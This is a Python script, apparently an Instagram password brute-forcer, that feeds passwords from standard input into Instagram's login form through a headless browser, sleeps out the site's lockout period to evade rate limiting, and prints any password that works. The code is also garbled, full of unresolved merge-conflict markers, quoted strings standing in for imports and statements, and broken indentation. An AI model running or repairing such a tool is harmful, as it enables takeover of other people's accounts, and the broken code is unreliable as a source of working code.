#!/bin/python
#<<<<<<< HEAD
#from splinter import Browser
#=======
#from tkinter import Browser
#>>>>>>> 4acfaa876b6d87300f7b5c8d6d830f1d2174ff85
import time
import sys
from tkinter import BROWSE
import webbrowser
#<<<<<<< Updated upstream
("from 'tkinter' import 'Browser")
#=======
#>>>>>>> Stashed changes
wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."

def logInSuccess(Browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not(Browser.is_text_present(user_err_msg) or Browser.is_text_present(pass_err_msg))

#<<<<<<< Updated upstream
("account_username =sys.argv[1]")
"with Browser('firefox', headless=True) to with Browser('chrome', headless=True)"
BROWSE.visit('https://www.instagram.com')
BROWSE.find_by_text('Log in').first.click()
username_form = BROWSE.find_by_name('username').first
password_form = BROWSE.find_by_name('password').first
login_button = BROWSE.find_by_text('Log in').first
username_form.fill('username')
for password in sys.stdin:correctPassword = None
#=======
("account_username =sys.argv[1]")
with 'browser'('firefox', headless=True) as browser:
    browser.visit('https://www.instagram.com')
    browser.find_by_text('Log in').first.click()
    username_form = browser.find_by_name('username').first
    password_form = browser.find_by_name('password').first
    login_button = browser.find_by_text('Log in').first
    username_form.fill('account_username')
    for password in sys.stdin:
#>>>>>>> Stashed changes
        if len(password) < 6:
            print('Skipping password: ' + password)
#>>>>continue

        print('Testing password: ' + password)
        password_form.clear()
        password_form.fill(password)
        login_button.click()

        if browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end.')
            time.sleep(wait_time)
            print('Timeout has ended, resuming.')
        elif logInSuccess(browser):
            correctPassword = password
            break
if correctPassword == None:
        print("Unable to find correct password.")
#<<<<<<< Updated upstream
else:
        print("Password for username:  + account_username  =  + password")
#=======
#else:
        print("Password for username:  + account_username  =  + password")
#>>>>>>> Stashed changes
